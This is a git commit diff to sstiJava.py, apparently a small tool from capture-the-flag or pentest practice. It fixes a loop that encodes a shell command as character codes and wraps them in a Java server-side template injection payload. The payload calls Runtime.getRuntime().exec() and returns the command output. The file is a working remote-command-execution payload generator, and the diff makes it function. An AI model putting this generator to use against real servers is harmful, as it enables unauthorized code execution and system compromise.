97b64f58ed4b90694f17de09e2b6bab533e277ff
unracer <59308598+unracer@users.noreply.github.com>
2022-09-24 15:28:36 +0100

    fix

--- sstiJava.py
+++ sstiJava.py
@@ -8,18 +8,23 @@ while True:
         #cmd to decimal
         for char in payloadSplit:
                 if char != '':
-                        payloadSplit[counter] =>
+                        payloadSplit[counter] = ord(char)
                         counter += 1
         payloadSplit[len(payloadSplit) - 2] = ''
 
         counter = 0
 
-        #decimal to make payload
-        payloadResult = '\n' + '*{T(org.apache.>
+        #decimal to payload
+        payloadResult = '\n' + '*{T(org.apache.commons.io.IOUtils)'
+        payloadResult += '.toString(T(java.lang.Runtime).getRuntime()'
+        payloadResult += '.exec(T(java.lang.Character).toString('+str(payloadSplit[0])+')'
+        
         for char in payloadSplit:
-                if (counter != 0) & (char != ''>
-                        payloadResult += '.conc>
+                if (counter != 0) & (char != ''):
+                        payloadResult += '.concat(T(java.lang.Character).toString('+str(char)+'))'
                 counter += 1
         payloadResult += ').getInputStream())}'
 
+        print('\n'+str(counter-2))
         print(payloadResult +'\n')
+
